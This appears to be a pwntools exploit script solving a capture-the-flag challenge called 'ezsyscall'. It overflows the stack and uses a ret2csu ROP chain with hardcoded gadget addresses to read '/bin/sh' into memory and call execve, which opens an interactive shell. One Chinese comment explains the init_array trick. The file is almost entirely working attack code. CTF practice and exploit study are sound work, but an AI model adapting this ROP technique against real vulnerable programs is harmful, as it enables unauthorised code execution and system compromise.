from pwn import*
p=process('./ezsyscall')
context.log_level='debug'
elf=ELF('./ezsyscall')
syscall=0x40119e
ret=0x40101a
pop_rax=0x4011ac
pop_rdi=0x4012a3
pop_rsi=0x4012a1
bss=0x404068 
read_got=elf.got['read']+24+0x10
csu_end=0x40129A
csu_front=0x401280
def csu(rbx,rbp,r12,r13,r14,r15):
    payload=b'a'*40
    payload+=p64(csu_end)
    payload+=p64(rbx)
    payload+=p64(rbp)
    payload+=p64(r12)
    payload+=p64(r13)
    payload+=p64(r14)
    payload+=p64(r15)
    payload+=p64(csu_front)
    payload+=b'a'*0x38
    payload+=p64(pop_rsi)
    payload+=p64(bss)
    payload+=p64(0)
    payload+=p64(pop_rax)
    payload+=p64(0)
    payload+=p64(syscall)
    payload+=p64(csu_end)
    payload+=p64(0)
    payload+=p64(1)
    payload+=p64(bss)
    payload+=p64(0)
    payload+=p64(0)
    payload += p64(0x403e10)
    payload += p64(csu_front)
    payload += p64(0) * 7
    payload += p64(pop_rax)
    payload += p64(59)
    payload += p64(syscall)
    print(len(payload))
    p.send(payload)
# gdb.attach(p)
# pause()
p.recvuntil(b'Here is your stack overflow. Do ret2csu!')
csu(0,1,0,bss,8,0x403e10)
#0x403e10为init_array地址，用于跳过call指令
sleep(0.5)
payload=b'/bin/sh\x00'
p.sendline(payload)
p.interactive()